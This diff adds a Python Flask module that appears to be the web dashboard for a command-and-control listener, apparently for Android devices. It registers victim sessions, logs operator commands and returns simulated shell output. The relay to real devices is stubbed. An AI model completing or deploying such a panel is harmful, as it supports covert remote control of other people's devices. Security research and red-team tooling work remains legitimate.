@@ -1,0 +1,166 @@
+#!/usr/bin/env python3
+"""
+Web Interface for C2 Listener
+"""
+
+from flask import Blueprint, render_template, jsonify, request
+import json
+from datetime import datetime
+
+# Create Blueprint
+c2_web = Blueprint('c2_web', __name__, template_folder='templates')
+
+# Store sessions in memory (in production use database)
+sessions = {}
+commands_history = {}
+
+@c2_web.route('/')
+def dashboard():
+    """C2 Web Dashboard"""
+    return render_template('c2_dashboard.html')
+
+@c2_web.route('/api/sessions')
+def get_sessions():
+    """Get all active sessions"""
+    return jsonify({
+        'success': True,
+        'sessions': list(sessions.values()),
+        'count': len(sessions)
+    })
+
+@c2_web.route('/api/session/<session_id>')
+def get_session(session_id):
+    """Get specific session details"""
+    session = sessions.get(session_id)
+    if session:
+        return jsonify({
+            'success': True,
+            'session': session
+        })
+    return jsonify({'success': False, 'error': 'Session not found'})
+
+@c2_web.route('/api/session/<session_id>/close', methods=['POST'])
+def close_session(session_id):
+    """Close a session"""
+    if session_id in sessions:
+        sessions[session_id]['status'] = 'closed'
+        sessions[session_id]['closed_at'] = datetime.now().isoformat()
+        return jsonify({'success': True})
+    return jsonify({'success': False, 'error': 'Session not found'})
+
+@c2_web.route('/api/session/<session_id>/command', methods=['POST'])
+def send_command(session_id):
+    """Send command to session"""
+    data = request.json
+    command = data.get('command', '')
+    
+    if not command:
+        return jsonify({'success': False, 'error': 'No command provided'})
+    
+    if session_id not in sessions:
+        return jsonify({'success': False, 'error': 'Session not found'})
+    
+    # Store command in history
+    if session_id not in commands_history:
+        commands_history[session_id] = []
+    
+    command_entry = {
+        'timestamp': datetime.now().isoformat(),
+        'command': command,
+        'session_id': session_id
+    }
+    
+    commands_history[session_id].append(command_entry)
+    
+    # In real implementation, send command to actual C2 listener
+    # For now, just simulate response
+    
+    simulated_responses = {
+        'whoami': 'shell\n',
+        'pwd': '/sdcard\n',
+        'ls': 'Android\nDCIM\nDownload\n',
+        'ifconfig': 'wlan0: inet 192.168.1.5\n',
+        'getprop': '[ro.build.version.sdk]: [29]\n'
+    }
+    
+    response = simulated_responses.get(command.strip(), f'Command executed: {command}\n')
+    
+    return jsonify({
+        'success': True,
+        'command': command,
+        'response': response,
+        'timestamp': datetime.now().isoformat()
+    })
+
+@c2_web.route('/api/session/<session_id>/history')
+def get_command_history(session_id):
+    """Get command history for session"""
+    history = commands_history.get(session_id, [])
+    return jsonify({
+        'success': True,
+        'history': history[-50:]  # Last 50 commands
+    })
+
+@c2_web.route('/api/stats')
+def get_stats():
+    """Get C2 statistics"""
+    active_sessions = len([s for s in sessions.values() if s.get('status') == 'active'])
+    total_commands = sum(len(h) for h in commands_history.values())
+    
+    return jsonify({
+        'success': True,
+        'stats': {
+            'total_sessions': len(sessions),
+            'active_sessions': active_sessions,
+            'inactive_sessions': len(sessions) - active_sessions,
+            'total_commands': total_commands,
+            'unique_ips': len(set(s.get('ip', '') for s in sessions.values()))
+        }
+    })
+
+# WebSocket endpoint (simplified)
+@c2_web.route('/ws')
+def websocket_endpoint():
+    """WebSocket endpoint for real-time updates"""
+    # In real implementation, use Flask-SocketIO or similar
+    return jsonify({'success': False, 'error': 'WebSocket not implemented'})
+
+# Register a new session (called by C2 listener)
+def register_session(session_id, ip_address, port, device_info=None):
+    """Register a new session from C2 listener"""
+    session_data = {
+        'id': session_id,
+        'ip': ip_address,
+        'port': port,
+        'device_info': device_info or {},
+        'status': 'active',
+        'connected_at': datetime.now().isoformat(),
+        'last_seen': datetime.now().isoformat(),
+        'commands_executed': 0
+    }
+    
+    sessions[session_id] = session_data
+    return session_data
+
+# Update session activity
+def update_session_activity(session_id):
+    """Update session last seen timestamp"""
+    if session_id in sessions:
+        sessions[session_id]['last_seen'] = datetime.now().isoformat()
+        return True
+    return False
+
+# Increment command count
+def increment_command_count(session_id):
+    """Increment command count for session"""
+    if session_id in sessions:
+        sessions[session_id]['commands_executed'] += 1
+        return True
+    return False
+
+if __name__ == "__main__":
+    print("C2 Web Interface Module")
+    print("Available routes:")
+    print("  /api/sessions - Get all sessions")
+    print("  /api/session/<id> - Get session details")
+    print("  /api/stats - Get statistics")
